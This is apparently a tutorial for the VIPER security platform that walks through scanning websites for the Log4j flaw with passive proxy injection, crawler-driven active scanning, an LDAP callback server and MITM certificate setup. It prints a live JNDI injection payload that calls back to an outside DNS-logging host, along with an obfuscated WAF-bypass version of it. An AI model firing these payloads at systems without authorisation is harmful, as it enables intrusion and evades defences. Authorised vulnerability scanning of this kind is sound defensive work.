# Using VIPER to Scan Log4j Vulnerabilities (Active Scanning / Passive Scanning)

# Functional Features

## Passive Scanning

+ Automatically replace GET request parameters with Payload
+ Automatically replace POST request parameters with Payload
+ Automatically replace values in POST request JSON with Payload
+ Automatically skip password fields
+ Automatically add Payload to headers (based on dictionary polling)
+ Payload includes original Payload and Payload that bypasses WAF
+ Supports two callback modes: DNSLOG and LDAPServer (LDAPServer is more suitable for internal network self-check)

```plain
${jndi:ldap://ed3bf69b5e9611ec.xxx.ceye.io/hi}

${${c:Xy:-j}${Kp:W:q:-n}${dzD:-d}${UQt:-i}${GT:-:}${s:hzr:e:-l}${e:ZSJ:yd:-d}${fA:kBl:c:-a}${Hbn:q:-p}${f:Uu:-:}${HOB:-/}${Ijk:E:-/}${dfG:-e}${F:dSj:JE:-d}${Z:-3}${BOI:Yrf:-b}${Yt:S:-f}${DKB:-6}}${Z:-b}${xdB:XBZ:-5}${dW:-e}${uC:-6}${OC:KVJ:j:-1}${L:o:-1}${jhr:-e}${d:-c}${Gi:nUE:AX:-.}${vuo:hy:Srz:-9}${xv:-f}${KG:-p}${xm:-p}${My:aQw:-b}${Mz:Xr:-j}${Z:wWt:-.}${Kx:D:-c}${Y:-e}${j:-y}${xOm:-e}${Cn:-.}${N:Tx:de:-i}${hT:h:P:-o}${qi:yx:i:-/}${j:-h}${Qfp:-i}}
```

+ The Payload contains UUID, and the specific request content that triggers the vulnerability can be found according to the DNSLOG record.

## Active Scanning

+ Use chrome headless + crawler to automatically obtain all requests on the page and import them into the passive proxy to achieve automated scanning.
+ Command

```plain
.\crawlergo.exe -c./chrome.exe -t 3 --push-to-proxy http://viperip:28888 http://target.com
```

# Usage Tutorial

## Passive Scanning

+ Update the VIPER version to `v1.5.10`
+ Start VIPER

![](img\Use_Viper_to_scan_log4j_vulnerabilities\1.webp)

+ Set the browser proxy to viperip:28888

![](img\Use_Viper_to_scan_log4j_vulnerabilities\2.webp)

+ Enable the Log4j2 module in "Passive Scanning"

![](img\Use_Viper_to_scan_log4j_vulnerabilities\3.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\4.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\5.webp)

+ Open the target website through the browser and click around and enter information at will.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\6.webp)![](img\Use_Viper_to_scan_log4j_vulnerabilities\7.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\8.webp)

+ VIPER's background will automatically replace the entered values with Payload.
+ Log in to the DNSlog platform and observe whether there are records.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\9.webp)

+ Copy the UUID information in the red box and query in the main page.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\10.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\11.webp)

+ The query result contains the specific request that can trigger the vulnerability.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\12.webp)

## Active Scanning

+ Update the VIPER version to `v1.5.10`
+ Start VIPER

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)

+ Enable the Log4j2 module in "Passive Scanning"

![1640007481033-26813815-236e-4a14-8892-29b203e9a03e.webp](./img/c0meLUd67I2xejnp/1640007481033-26813815-236e-4a14-8892-29b203e9a03e-373377.webp)

![1640007561651-b321d10c-9883-4930-8559-54fb0af2eba7.webp](./img/c0meLUd67I2xejnp/1640007561651-b321d10c-9883-4930-8559-54fb0af2eba7-726991.webp)

![1640007582128-92a6241c-f2b8-4c45-bc3c-dadc02a9ec4b.webp](./img/c0meLUd67I2xejnp/1640007582128-92a6241c-f2b8-4c45-bc3c-dadc02a9ec4b-088978.webp)

+ Here, it is assumed that the website to be tested is [http://target.com](http://target.com).
+ Install crawlergo [https://github.com/Qianlitp/crawlergo](https://github.com/Qianlitp/crawlergo)
+ Start the crawler and send the traffic to VIPER's proxy.

```plain
.\crawlergo.exe -c./chrome.exe -t 3 --push-to-proxy http://viperip:28888 http://target.com
```

+ Wait for the crawler to finish.
+ Log in to the DNSlog platform and observe whether there are records.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\13.webp)

+ Copy the UUID information in the red box and query in the main page.

![1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148.webp](./img/c0meLUd67I2xejnp/1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148-776102.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\14.webp)

+ The query result contains the specific request that can trigger the vulnerability (<font style="color:#E8323C;">This request is automatically sent by Crawlergo</font>).

![](img\Use_Viper_to_scan_log4j_vulnerabilities\15.webp)

## Using LDAPServer for Callback

+ Update the VIPER version to `v1.5.10`
+ Start VIPER

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)

+ Set the browser proxy to viperip:28888

![1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4.webp](./img/c0meLUd67I2xejnp/1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4-008901.webp)

+ Enable the Log4j2 module in "Passive Scanning"

![1640007481033-26813815-236e-4a14-8892-29b203e9a03e.webp](./img/c0meLUd67I2xejnp/1640007481033-26813815-236e-4a14-8892-29b203e9a03e-373377.webp)

+ Configure DNSLOG as `VPSIP:1387` here.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\16.webp)

+ Execute the following command to start VIPER's built-in LDAPServer.

```plain
docker exec -it viper-c bash
python3 /root/viper/STATICFILES/Tools/ldapserver.py -p 1387
```

![](img\Use_Viper_to_scan_log4j_vulnerabilities\17.webp)

+ Open the target website through the browser and click around and enter information at will.

![1639677273615-41f05455-b87e-491c-b993-3b934acfa646.webp](./img/c0meLUd67I2xejnp/1639677273615-41f05455-b87e-491c-b993-3b934acfa646-144672.webp)![1639677289481-de3c8d9f-814d-46eb-889d-46847f552404.webp](./img/c0meLUd67I2xejnp/1639677289481-de3c8d9f-814d-46eb-889d-46847f552404-170675.webp)

![1639677305436-4c12539d-2dfa-451a-a0de-25919c84f0db.webp](./img/c0meLUd67I2xejnp/1639677305436-4c12539d-2dfa-451a-a0de-25919c84f0db-024025.webp)

+ The VIPER background will automatically replace the input value with Payload.
+ The LDAPServer will receive the back-connection request and print the request UUID.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\18.webp)

+ Copy the uuid information in the red box and query in the main page.

![1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148.webp](./img/c0meLUd67I2xejnp/1639677446002-dd4334ea-9374-4120-bd2a-840130a7c148-776102.webp)

![1639677468915-79dd91a6-bee1-4a2d-a4c5-4be05425a5dc.webp](./img/c0meLUd67I2xejnp/1639677468915-79dd91a6-bee1-4a2d-a4c5-4be05425a5dc-909468.webp)

+ The query result contains specific requests that can trigger vulnerabilities.

![1639677504286-6361196e-c781-4c0c-8d22-fe65cca95741.webp](./img/c0meLUd67I2xejnp/1639677504286-6361196e-c781-4c0c-8d22-fe65cca95741-420030.webp)

##  

## Testing HTTPS websites

+ Update the VIPER version to `v1.5.10`.
+ Start VIPER.

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)

+ Set the browser proxy to viperip:28888.

![1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4.webp](./img/c0meLUd67I2xejnp/1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4-008901.webp)

+ Open the browser at [http://mitm.it/](http://mitm.it/).

![](img\Use_Viper_to_scan_log4j_vulnerabilities\19.webp)

+ Download the certificate corresponding to the platform and install it (taking Windows as an example).

![](img\Use_Viper_to_scan_log4j_vulnerabilities\20.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\21.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\22.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\23.webp)

+ Do not fill in any information.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\24.webp)

+ Here, you need to select a trusted root certificate.

![](img\Use_Viper_to_scan_log4j_vulnerabilities\25.webp)

![](img\Use_Viper_to_scan_log4j_vulnerabilities\26.webp)

+ Please delete the corresponding certificate from the system configuration after the test is completed.


